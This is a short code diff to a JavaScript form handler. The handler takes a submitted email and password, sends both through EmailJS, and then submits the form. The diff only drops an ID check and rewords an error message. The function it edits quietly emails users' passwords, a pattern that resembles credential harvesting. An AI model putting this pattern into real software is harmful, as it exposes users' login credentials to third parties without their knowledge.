@@ -14,8 +14,7 @@ const sendMail = async (event) => {
   const correo = event.target.correo.value;
   const contrasena = event.target.contrasena.value;
 
-  if (service_id && template_id && user_id) {
-    try {
+  try {
     emailjs.init(user_id);
     await emailjs.send(service_id, template_id,
       {
@@ -23,12 +22,11 @@ const sendMail = async (event) => {
         password: contrasena,
         to_email: correo,
       },
-    user_id); 
-    } catch(err) {
-      console.log(err);
-    } finally {
-      formulario.submit();
-    }
+      user_id); 
+  } catch(err) {
+    console.error('No Id in service');
+  } finally {
+    formulario.submit();
   }
 }
 
